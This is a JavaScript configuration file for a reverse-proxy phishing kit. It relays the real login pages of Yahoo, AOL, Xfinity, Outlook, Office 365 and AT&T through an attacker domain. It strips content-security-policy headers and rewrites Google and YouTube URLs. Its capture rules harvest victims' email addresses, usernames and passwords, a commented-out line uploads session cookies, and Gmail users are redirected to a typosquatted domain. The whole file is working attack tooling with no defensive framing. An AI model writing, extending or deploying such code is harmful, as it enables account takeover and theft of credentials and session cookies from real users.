/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
        super(proxyResp, browserEndPoint)
        this.regexes = [
             {
                 reg: /play.google.com/ig,
                 replacement: `${process.env.HOST_DOMAIN}/playboy`,
             },
            {
                reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
                replacement: `${process.env.HOST_DOMAIN}/CheckConnection`,
            },
            {
                reg: /name="checkConnection" value/gi,
                replacement: /name"checkConnection" value="youtube:1052:1"/,
            },
        ]
    }


    processResponse() {
        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

            /** AOL SUCCESS REDIRECT */
            if (rLocation.startsWith('https://api.login.aol.com/oauth2/request_auth')
                || rLocation.startsWith('https://guce.aol.com/consent?gcrumb=') || rLocation === 'https://www.aol.com/') {
                this.afterEmailPath()
            } if (rLocation.startsWith('https://account.live.com') || rLocation.startsWith('https://account.microsoft.com')) {
                this.afterEmailPath()
            } if (rLocation.startsWith('https://www.yahoo.com/?guccounter=1&guce_referrer=') || rLocation === 'https://www.yahoo.com/' 
            || rLocation.startsWith('/account/comm-channel/refresh')) {
                this.afterEmailPath()
            } if (rLocation === 'https://www.office.com/landing') {
                this.afterEmailPath()
            }
        }
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        this.browserEndPoint.removeHeader('content-security-policy')
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    afterEmailPath() {
        // globalWorker.uploadCookies(this.browserEndPoint.context,
            // { clientSession: this.browserEndPoint.clientSession })
        this.browserEndPoint.setHeader('location', '/auth/login/finish')
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {
        const redirectToken = super.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Instance K ${redirectToken}`)
        }


        if (clientContext.info.disableDeflate) {
            this.req.headers['accept-encoding'] = 'gzip, br'
        }


        if (this.req.url.startsWith('/playboy')) {
            const qhost = 'play.google.com'
            this.req.url = this.req.url.replace('/playboy/log', '/log')
            return super.superExecuteProxy(qhost, clientContext)
        }
        if (this.req.url.startsWith('/CheckConnection')) {
            this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
            return super.superExecuteProxy('accounts.youtube.com', clientContext)
        }
        if (this.req.url.startsWith('/kmsi') || this.req.url.startsWith('/account/upsell/webauthn') || this.req.url.startsWith('/account/fb-messenger-linking')) {
            // super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: '/auth/login/finish' })
            return this.res.end('')
        }
        this.req.headers['accept-encoding'] = 'gzip, br'
        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}

const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/app/secure/');

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {

            if (this.req.url === '/app/secure/addons/emailvalidate') {
                clientContext.setLogAvailable(true)
                super.superExecutePhpScript('addons/emailvalidate.php', clientContext)
            } else {
                this.res.writeHead(404)
                this.res.end()
            }
        } else {
            switch (this.req.url) {
                case '/app/secure/login':
                    super.superExecutePhpScript('index.html', clientContext)
                    break
                default:
                    super.superExecutePhpScript('app/404.php', clientContext)
            }
        }
    }


}


const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        if (req.url.startsWith('/auth/login/')) {
            return true
        } return false
    }

    execute(clientContext) {
        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.yahoo.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/comcast') {
                this.req.url = '/login?r=comcast.net&s=oauth'
                clientContext.currentDomain = 'login.xfinity.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/gmail') {
                // eslint-disable-next-line max-len
                /** this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
                clientContext.currentDomain = 'accounts.google.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext) */
                this.res.writeHead(302, { location: 'https://www.googl3uth.com/b/wZKOnZ/' })
                return this.res.end('')
            }
            if (this.req.url === '/auth/login/outlook') {
                clientContext.info.disableDeflate = true;
                this.req.headers['accept-encoding'] = 'gzip, br'
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/att') {
                this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
                clientContext.currentDomain = 'caaid.att.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/finish') {
                this.res.writeHead(200)
                return this.res.end(`<!DOCTYPE html>
                                    <html>
                                    <body>
                                    <script>
                                    window.opener.sessionStorage.setItem("finished", "YES");
                                    close()
                                    </script>
                                    </body>
                                    </html>
                                    `)
            }
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}


const configExport = {
    CURRENT_DOMAIN: 'www.example.com',
    START_PATH: '/app/secure/login',
    PRE_HANDLERS:
        [
            ExecPhpPager,
            EmailLoginHandler,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
       
        victimEmail: {
            method: 'POST',
            params: ['emaildress'],
            urls: '/',
            hosts: 'PHP-EXEC',
        },
        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

